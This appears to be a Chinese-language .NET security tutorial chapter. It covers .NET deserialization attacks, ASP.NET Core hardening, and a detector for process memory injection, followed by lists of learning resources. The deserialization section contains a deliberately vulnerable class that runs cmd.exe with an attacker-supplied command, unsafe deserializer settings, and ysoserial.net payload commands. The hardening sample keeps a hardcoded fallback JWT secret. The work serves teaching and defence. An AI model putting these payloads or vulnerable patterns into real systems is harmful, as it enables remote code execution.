---

## 四、高级实战案例

### 4.1 .NET 反序列化漏洞利用

C# 反序列化漏洞原理与常见攻击链。

```csharp
using System;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Web.Script.Serialization;
using Newtonsoft.Json;

// ===== 危险的反序列化示例 =====
// 警告：以下代码仅用于安全研究，请勿在生产环境使用

namespace DeserializationLab
{
    [Serializable]
    public class VulnerableClass : ISerializable
    {
        public string Command { get; set; }
        
        public VulnerableClass() { }
        
        // 反序列化时自动调用的构造函数
        protected VulnerableClass(SerializationInfo info, StreamingContext context)
        {
            Command = info.GetString("Command");
            // 漏洞点：反序列化时执行命令
            System.Diagnostics.Process.Start("cmd.exe", "/c " + Command);
        }
        
        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.AddValue("Command", Command);
        }
    }
    
    class Program
    {
        // ===== BinaryFormatter 反序列化 =====
        // 这是最经典的 .NET 反序列化漏洞
        static object BinaryDeserialize(byte[] data)
        {
            BinaryFormatter formatter = new BinaryFormatter();
            using (MemoryStream ms = new MemoryStream(data))
            {
                // 危险：反序列化不受信任的数据
                return formatter.Deserialize(ms);
            }
        }
        
        // ===== JSON.NET 反序列化漏洞 =====
        // TypeNameHandling 设置为 All 时可能导致代码执行
        static object JsonNetDeserialize(string json)
        {
            JsonSerializerSettings settings = new JsonSerializerSettings
            {
                // 危险设置：允许 JSON 指定类型
                TypeNameHandling = TypeNameHandling.All
            };
            return JsonConvert.DeserializeObject(json, settings);
        }
        
        // ===== JavaScriptSerializer 反序列化 =====
        // SimpleTypeResolver 可能导致反序列化漏洞
        static object JavaScriptSerializerDeserialize(string json)
        {
            JavaScriptSerializer serializer = new JavaScriptSerializer(new SimpleTypeResolver());
            // 危险：使用 SimpleTypeResolver
            return serializer.DeserializeObject(json);
        }
        
        // ===== 安全的反序列化方式 =====
        static T SafeDeserialize<T>(string json)
        {
            // 正确：指定具体类型，不使用 TypeNameHandling
            return JsonConvert.DeserializeObject<T>(json);
        }
        
        // ===== 生成恶意 Payload =====
        static byte[] GenerateBinaryPayload(string command)
        {
            // 使用 ActivitySurrogateSelector 或其他 gadget
            // 实际利用工具：ysoserial.net
            VulnerableClass obj = new VulnerableClass { Command = command };
            
            BinaryFormatter formatter = new BinaryFormatter();
            using (MemoryStream ms = new MemoryStream())
            {
                formatter.Serialize(ms, obj);
                return ms.ToArray();
            }
        }
        
        static void Main(string[] args)
        {
            Console.WriteLine("=== .NET 反序列化漏洞演示 ===");
            Console.WriteLine("注意：仅用于授权安全测试\n");
            
            // 演示安全反序列化
            var safeObj = SafeDeserialize<Person>("{\"Name\":\"test\",\"Age\":25}");
            Console.WriteLine($"安全反序列化: {safeObj.Name}, {safeObj.Age}");
        }
    }
    
    public class Person
    {
        public string Name { get; set; }
        public int Age { get; set; }
    }
}

/*
    ===== ysoserial.net 常用 payload =====
    
    BinaryFormatter:
    ysoserial.exe -g ObjectDataProvider -f BinaryFormatter -c "calc.exe"
    
    JSON.NET (TypeNameHandling):
    ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"
    
    LosFormatter:
    ysoserial.exe -g ActivitySurrogateSelectorFromFile -f LosFormatter
    
    工具地址: https://github.com/pwntester/ysoserial.net
*/
```

### 4.2 ASP.NET Core 安全开发

ASP.NET Core 安全最佳实践与防护措施。

```csharp
using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Identity;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.IdentityModel.Tokens;
using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;
using System.Security.Cryptography;
using System.Text;
using System.Text.Encodings.Web;
using Microsoft.AspNetCore.Authentication.JwtBearer;
using Microsoft.AspNetCore.DataProtection;

namespace SecureWebApp
{
    public class Startup
    {
        public void ConfigureServices(IServiceCollection services)
        {
            // ===== 1. 数据库配置 =====
            services.AddDbContext<ApplicationDbContext>(options =>
                options.UseSqlServer(
                    "Server=.;Database=SecureApp;Trusted_Connection=True;TrustServerCertificate=True;"
                ));
            
            // ===== 2. Identity 配置 =====
            services.AddIdentity<IdentityUser, IdentityRole>(options =>
                {
                    // 密码策略
                    options.Password.RequireDigit = true;
                    options.Password.RequireLowercase = true;
                    options.Password.RequireUppercase = true;
                    options.Password.RequireNonAlphanumeric = true;
                    options.Password.RequiredLength = 12;
                    options.Password.RequiredUniqueChars = 6;
                    
                    // 锁定策略
                    options.Lockout.DefaultLockoutTimeSpan = TimeSpan.FromMinutes(15);
                    options.Lockout.MaxFailedAccessAttempts = 5;
                    options.Lockout.AllowedForNewUsers = true;
                    
                    // 用户设置
                    options.User.RequireUniqueEmail = true;
                    
                    // 登录设置
                    options.SignIn.RequireConfirmedEmail = true;
                    options.SignIn.RequireConfirmedPhoneNumber = false;
                })
                .AddEntityFrameworkStores<ApplicationDbContext>()
                .AddDefaultTokenProviders();
            
            // ===== 3. JWT 认证配置 =====
            var jwtKey = Environment.GetEnvironmentVariable("JWT_KEY") ?? "your-very-long-secret-key-at-least-32-characters";
            
            services.AddAuthentication(options =>
                {
                    options.DefaultAuthenticateScheme = JwtBearerDefaults.AuthenticationScheme;
                    options.DefaultChallengeScheme = JwtBearerDefaults.AuthenticationScheme;
                })
                .AddJwtBearer(options =>
                {
                    options.TokenValidationParameters = new TokenValidationParameters
                    {
                        ValidateIssuer = true,
                        ValidateAudience = true,
                        ValidateLifetime = true,
                        ValidateIssuerSigningKey = true,
                        ValidIssuer = "your-app-name",
                        ValidAudience = "your-app-name",
                        IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(jwtKey)),
                        ClockSkew = TimeSpan.Zero  // 零容忍过期
                    };
                });
            
            // ===== 4. 授权策略 =====
            services.AddAuthorization(options =>
            {
                options.AddPolicy("RequireAdmin", policy =>
                    policy.RequireRole("Admin"));
                
                options.AddPolicy("RequireManager", policy =>
                    policy.RequireAssertion(context =>
                        context.User.IsInRole("Admin") ||
                        context.User.IsInRole("Manager")));
                
                // 自定义策略
                options.AddPolicy("MinimumAge", policy =>
                    policy.RequireClaim("Age", "18"));
            });
            
            // ===== 5. 数据保护 =====
            services.AddDataProtection()
                .PersistKeysToDbContext<ApplicationDbContext>()
                .SetApplicationName("SecureApp")
                .SetDefaultKeyLifetime(TimeSpan.FromDays(90));
            
            // ===== 6. CORS 安全配置 =====
            services.AddCors(options =>
            {
                options.AddPolicy("AllowSpecificOrigins",
                    builder =>
                    {
                        builder.WithOrigins("https://example.com", "https://app.example.com")
                               .AllowAnyHeader()
                               .AllowAnyMethod()
                               .AllowCredentials()
                               .SetPreflightMaxAge(TimeSpan.FromHours(1));
                    });
            });
            
            // ===== 7. MVC 与 Razor =====
            services.AddControllersWithViews()
                .AddRazorPagesOptions(options =>
                {
                    options.Conventions.AuthorizeFolder("/Admin");
                    options.Conventions.AuthorizePage("/Privacy");
                });
            
            // ===== 8. 速率限制 =====
            services.AddMemoryCache();
        }
        
        public void Configure(IApplicationBuilder app)
        {
            // ===== 安全中间件顺序很重要 =====
            
            // 1. 错误处理（开发环境用开发者异常页）
            app.UseDeveloperExceptionPage();
            
            // 2. HTTPS 重定向
            app.UseHttpsRedirection();
            
            // 3. 安全头
            app.UseSecurityHeaders();
            
            // 4. 静态文件
            app.UseStaticFiles();
            
            // 5. 路由
            app.UseRouting();
            
            // 6. CORS
            app.UseCors("AllowSpecificOrigins");
            
            // 7. 认证
            app.UseAuthentication();
            
            // 8. 授权
            app.UseAuthorization();
            
            // 9. 端点
            app.UseEndpoints(endpoints =>
            {
                endpoints.MapControllerRoute(
                    name: "default",
                    pattern: "{controller=Home}/{action=Index}/{id?}");
                endpoints.MapRazorPages();
            });
        }
    }
    
    // ===== 安全头中间件 =====
    public static class SecurityHeadersMiddlewareExtensions
    {
        public static IApplicationBuilder UseSecurityHeaders(this IApplicationBuilder app)
        {
            app.Use(async (context, next) =>
            {
                // X-Content-Type-Options
                context.Response.Headers["X-Content-Type-Options"] = "nosniff";
                
                // X-Frame-Options
                context.Response.Headers["X-Frame-Options"] = "DENY";
                
                // X-XSS-Protection (现代浏览器已废弃，但旧浏览器仍有用)
                context.Response.Headers["X-XSS-Protection"] = "1; mode=block";
                
                // Referrer Policy
                context.Response.Headers["Referrer-Policy"] = "strict-origin-when-cross-origin";
                
                // Content Security Policy
                context.Response.Headers["Content-Security-Policy"] = 
                    "default-src 'self'; " +
                    "script-src 'self' 'unsafe-inline'; " +
                    "style-src 'self' 'unsafe-inline'; " +
                    "img-src 'self' data:; " +
                    "font-src 'self'; " +
                    "frame-ancestors 'none'; " +
                    "form-action 'self';";
                
                // Permissions Policy
                context.Response.Headers["Permissions-Policy"] = 
                    "camera=(), microphone=(), geolocation=(), interest-cohort=()";
                
                // Strict-Transport-Security (HSTS)
                context.Response.Headers["Strict-Transport-Security"] = 
                    "max-age=31536000; includeSubDomains";
                
                await next();
            });
            
            return app;
        }
    }
    
    // ===== JWT 工具类 =====
    public class JwtTokenService
    {
        private readonly string _secretKey;
        private readonly string _issuer;
        
        public JwtTokenService(string secretKey, string issuer)
        {
            _secretKey = secretKey;
            _issuer = issuer;
        }
        
        public string GenerateToken(IdentityUser user, IList<string> roles)
        {
            var claims = new List<Claim>
            {
                new Claim(ClaimTypes.NameIdentifier, user.Id),
                new Claim(ClaimTypes.Name, user.UserName),
                new Claim(ClaimTypes.Email, user.Email),
                new Claim(JwtRegisteredClaimNames.Jti, Guid.NewGuid().ToString())
            };
            
            foreach (var role in roles)
            {
                claims.Add(new Claim(ClaimTypes.Role, role));
            }
            
            var key = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_secretKey));
            var creds = new SigningCredentials(key, SecurityAlgorithms.HmacSha256);
            
            var token = new JwtSecurityToken(
                issuer: _issuer,
                audience: _issuer,
                claims: claims,
                expires: DateTime.UtcNow.AddHours(1),
                signingCredentials: creds
            );
            
            return new JwtSecurityTokenHandler().WriteToken(token);
        }
    }
    
    // ===== 加密工具 =====
    public static class EncryptionHelper
    {
        // AES 加密
        public static string AesEncrypt(string plainText, string key)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = Encoding.UTF8.GetBytes(key.PadRight(32).Substring(0, 32));
                aes.GenerateIV();
                
                ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);
                
                using (MemoryStream ms = new MemoryStream())
                {
                    // 先写入 IV
                    ms.Write(aes.IV, 0, aes.IV.Length);
                    
                    using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                    using (StreamWriter sw = new StreamWriter(cs))
                    {
                        sw.Write(plainText);
                    }
                    
                    return Convert.ToBase64String(ms.ToArray());
                }
            }
        }
        
        // AES 解密
        public static string AesDecrypt(string cipherText, string key)
        {
            byte[] cipherBytes = Convert.FromBase64String(cipherText);
            
            using (Aes aes = Aes.Create())
            {
                aes.Key = Encoding.UTF8.GetBytes(key.PadRight(32).Substring(0, 32));
                
                // 从密文中提取 IV
                byte[] iv = new byte[16];
                Array.Copy(cipherBytes, 0, iv, 0, 16);
                aes.IV = iv;
                
                byte[] actualCipher = new byte[cipherBytes.Length - 16];
                Array.Copy(cipherBytes, 16, actualCipher, 0, actualCipher.Length);
                
                ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);
                
                using (MemoryStream ms = new MemoryStream(actualCipher))
                using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                using (StreamReader sr = new StreamReader(cs))
                {
                    return sr.ReadToEnd();
                }
            }
        }
        
        // 哈希密码 (使用 ASP.NET Core Identity 的方式)
        public static string HashPassword(string password)
        {
            var hasher = new PasswordHasher<object>();
            return hasher.HashPassword(null, password);
        }
        
        public static bool VerifyPassword(string hashedPassword, string providedPassword)
        {
            var hasher = new PasswordHasher<object>();
            var result = hasher.VerifyHashedPassword(null, hashedPassword, providedPassword);
            return result == PasswordVerificationResult.Success ||
                   result == PasswordVerificationResult.SuccessRehashNeeded;
        }
    }
}
```

### 4.3 内存取证与注入检测

使用 C# 进行进程内存分析。

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Collections.Generic;
using System.Linq;

namespace MemoryAnalysis
{
    public class MemoryInspector
    {
        #region WinAPI 导入
        
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            VirtualMemoryRead = 0x00000010,
            QueryInformation = 0x00000400
        }
        
        [Flags]
        public enum MemoryProtection : uint
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            Guard = 0x100,
            NoCache = 0x200,
            WriteCombine = 0x400
        }
        
        [Flags]
        public enum MemoryState : uint
        {
            Commit = 0x1000,
            Free = 0x10000,
            Reserve = 0x2000
        }
        
        [Flags]
        public enum MemoryType : uint
        {
            Image = 0x1000000,
            Mapped = 0x40000,
            Private = 0x20000
        }
        
        [StructLayout(LayoutKind.Sequential)]
        public struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public MemoryProtection AllocationProtect;
            public IntPtr RegionSize;
            public MemoryState State;
            public MemoryProtection Protect;
            public MemoryType Type;
        }
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, 
            byte[] lpBuffer, int dwSize, out int lpNumberOfBytesRead);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, 
            out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
        
        [DllImport("psapi.dll", SetLastError = true)]
        public static extern bool EnumProcessModules(IntPtr hProcess, 
            [Out] IntPtr[] lphModule, uint cb, out uint lpcbNeeded);
        
        [DllImport("psapi.dll", CharSet = CharSet.Auto)]
        public static extern uint GetModuleBaseName(IntPtr hProcess, IntPtr hModule, 
            [Out] StringBuilder lpBaseName, uint nSize);
        
        #endregion
        
        // ===== 检查是否以管理员权限运行 =====
        public static bool IsAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
        
        // ===== 扫描进程中可执行的内存区域 =====
        public static List<MEMORY_BASIC_INFORMATION> ScanExecutableRegions(int pid)
        {
            List<MEMORY_BASIC_INFORMATION> regions = new List<MEMORY_BASIC_INFORMATION>();
            IntPtr hProcess = OpenProcess(ProcessAccessFlags.QueryInformation | ProcessAccessFlags.VirtualMemoryRead, false, pid);
            
            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine($"无法打开进程 {pid}: {Marshal.GetLastWin32Error()}");
                return regions;
            }
            
            IntPtr currentAddress = IntPtr.Zero;
            MEMORY_BASIC_INFORMATION mbi;
            
            while (VirtualQueryEx(hProcess, currentAddress, out mbi, 
                (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION))) != 0)
            {
                if (mbi.State == MemoryState.Commit)
                {
                    // 检查是否是可执行内存
                    bool isExecutable = 
                        mbi.Protect.HasFlag(MemoryProtection.Execute) ||
                        mbi.Protect.HasFlag(MemoryProtection.ExecuteRead) ||
                        mbi.Protect.HasFlag(MemoryProtection.ExecuteReadWrite) ||
                        mbi.Protect.HasFlag(MemoryProtection.ExecuteWriteCopy);
                    
                    // 检查是否是 RWX (可写可执行，高度可疑)
                    bool isRWX = mbi.Protect.HasFlag(MemoryProtection.ExecuteReadWrite);
                    
                    // 检查是否是私有内存（非模块映射）
                    bool isPrivate = mbi.Type == MemoryType.Private;
                    
                    if (isExecutable && isPrivate)
                    {
                        regions.Add(mbi);
                        
                        if (isRWX)
                        {
                            Console.WriteLine($"  [!] 发现 RWX 区域: 0x{mbi.BaseAddress.ToInt64():X16} - {mbi.RegionSize.ToInt64()} bytes");
                        }
                    }
                }
                
                // 移动到下一个区域
                long nextAddress = mbi.BaseAddress.ToInt64() + mbi.RegionSize.ToInt64();
                currentAddress = new IntPtr(nextAddress);
                
                // 64位进程地址空间上限检查
                if (IntPtr.Size == 8 && nextAddress >= 0x00007FFFFFFF0000)
                    break;
            }
            
            CloseHandle(hProcess);
            return regions;
        }
        
        // ===== 检测进程注入特征 =====
        public static List<string> DetectInjection(int pid)
        {
            List<string> findings = new List<string>();
            
            IntPtr hProcess = OpenProcess(ProcessAccessFlags.QueryInformation | ProcessAccessFlags.VirtualMemoryRead, false, pid);
            if (hProcess == IntPtr.Zero) return findings;
            
            try
            {
                IntPtr currentAddress = IntPtr.Zero;
                MEMORY_BASIC_INFORMATION mbi;
                
                while (VirtualQueryEx(hProcess, currentAddress, out mbi, 
                    (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION))) != 0)
                {
                    if (mbi.State == MemoryState.Commit && mbi.Type == MemoryType.Private)
                    {
                        // 1. RWX 内存（高度可疑）
                        if (mbi.Protect == MemoryProtection.ExecuteReadWrite)
                        {
                            findings.Add($"RWX 私有内存区域: 0x{mbi.BaseAddress.ToInt64():X} ({mbi.RegionSize.ToInt64()} bytes)");
                        }
                        
                        // 2. 可执行且非映射的内存
                        bool isExec = mbi.Protect.HasFlag(MemoryProtection.Execute) ||
                                     mbi.Protect.HasFlag(MemoryProtection.ExecuteRead) ||
                                     mbi.Protect.HasFlag(MemoryProtection.ExecuteReadWrite);
                        
                        if (isExec && mbi.Type == MemoryType.Private)
                        {
                            // 读取前几个字节检查是否是 MZ header (注入的 DLL)
                            byte[] buffer = new byte[2];
                            int bytesRead;
                            if (ReadProcessMemory(hProcess, mbi.BaseAddress, buffer, 2, out bytesRead) && bytesRead == 2)
                            {
                                if (buffer[0] == 0x4D && buffer[1] == 0x5A) // MZ
                                {
                                    findings.Add($"私有可执行内存包含 MZ header: 0x{mbi.BaseAddress.ToInt64():X}");
                                }
                            }
                        }
                    }
                    
                    long nextAddress = mbi.BaseAddress.ToInt64() + mbi.RegionSize.ToInt64();
                    currentAddress = new IntPtr(nextAddress);
                    
                    if (IntPtr.Size == 8 && nextAddress >= 0x00007FFFFFFF0000)
                        break;
                }
            }
            finally
            {
                CloseHandle(hProcess);
            }
            
            return findings;
        }
        
        // ===== 列出所有进程并检测可疑注入 =====
        public static void ScanAllProcesses()
        {
            Console.WriteLine("=== 进程注入检测 ===");
            Console.WriteLine($"管理员权限: {IsAdministrator()}");
            Console.WriteLine();
            
            var processes = Process.GetProcesses()
                .OrderBy(p => p.ProcessName)
                .ToList();
            
            foreach (var proc in processes)
            {
                try
                {
                    var findings = DetectInjection(proc.Id);
                    if (findings.Count > 0)
                    {
                        Console.WriteLine($"[{proc.Id}] {proc.ProcessName}:");
                        foreach (var f in findings)
                        {
                            Console.WriteLine($"  - {f}");
                        }
                        Console.WriteLine();
                    }
                }
                catch
                {
                    // 权限不足等，跳过
                }
            }
        }
    }
    
    class Program
    {
        static void Main(string[] args)
        {
            if (!MemoryInspector.IsAdministrator())
            {
                Console.WriteLine("[!] 建议以管理员权限运行以获得完整扫描结果");
            }
            
            MemoryInspector.ScanAllProcesses();
        }
    }
}
```

---

## 五、进阶学习资源

### 5.1 .NET 安全资源

- **Microsoft 安全文档**：https://learn.microsoft.com/zh-cn/dotnet/standard/security/
- **ASP.NET Core 安全**：https://learn.microsoft.com/zh-cn/aspnet/core/security/
- **OWASP .NET 安全**：https://cheatsheetseries.owasp.org/cheatsheets/DotNet_Security_Cheat_Sheet.html
- **.NET 安全博客**：https://www.measuringsecuritysuccess.com/

### 5.2 反序列化与漏洞研究

- **ysoserial.net**：https://github.com/pwntester/ysoserial.net — .NET 反序列化 payload 生成
- **DNSpy**：https://github.com/dnSpy/dnSpy — .NET 调试器和反编译器
- **ILSpy**：https://github.com/icsharpcode/ILSpy — .NET 反编译器
- **de4dot**：https://github.com/de4dot/de4dot — .NET 脱壳工具

### 5.3 安全工具与库

- **安全开发**：
  - Microsoft.AspNetCore.Identity — 身份认证
  - Microsoft.AspNetCore.DataProtection — 数据保护
  - IdentityServer — 身份认证服务
  - Duende IdentityServer — 商业版 IdentityServer

- **代码分析**：
  - Roslyn Analyzers — 代码分析器
  - SonarQube — 代码质量平台
  - Semgrep — 静态分析
  - Microsoft.CodeAnalysis.FxCopAnalyzers

- **渗透测试**：
  - dnSpy — .NET 逆向
  - ILSpy — 反编译
  - ConfuserEx — 混淆器（研究用）
  - Mono.Cecil — IL 操作库

### 5.4 CTF 与练习平台

- **Hack The Box**：https://www.hackthebox.com/
- **TryHackMe**：https://tryhackme.com/
- **攻防世界**：https://adworld.xctf.org.cn/
- **BUUCTF**：https://buuoj.cn/
- **picoCTF**：https://picoctf.org/

### 5.5 推荐书籍

- **C# 编程**：
  - 《C# 7.0 核心技术指南》
  - 《CLR via C#》
  - 《C# 高级编程》

- **.NET 安全**：
  - 《.NET 安全编程》
  - 《C# 网络编程》
  - 《白帽子讲 Web 安全》

- **逆向工程**：
  - 《加密与解密》
  - 《.NET 逆向工程》
  - 《恶意代码分析实战》

### 5.6 社区与博客

- **微软安全博客**：https://www.microsoft.com/security/blog/
- **.NET 博客**：https://devblogs.microsoft.com/dotnet/
- **看雪论坛 .NET 板块**：https://bbs.pediy.com/
- **FreeBuf**：https://www.freebuf.com/
- **安全客**：https://www.anquanke.com/

### 5.7 进阶学习路线

**第 1 阶段：C# / .NET 精通（2-3月）**
- C# 高级特性（泛型、LINQ、异步）
- .NET 底层原理（CLR、GC、JIT）
- ASP.NET Core 深入
- EF Core 与数据库

**第 2 阶段：安全开发（2-3月）**
- 认证与授权
- 加密与数据保护
- 安全头与 CSP
- OWASP Top 10 防护

**第 3 阶段：漏洞研究（3-6月）**
- 反序列化漏洞
- ViewState 安全
- ASP.NET 管道攻击
- .NET 内部机制

**第 4 阶段：逆向与破解（3-6月）**
- IL 与 MSIL
- 混淆与脱壳
- 逆向工程
- 补丁与破解

**第 5 阶段：实战与贡献（持续）**
- CTF .NET 题目
- 漏洞挖掘
- 工具开发
- 开源贡献
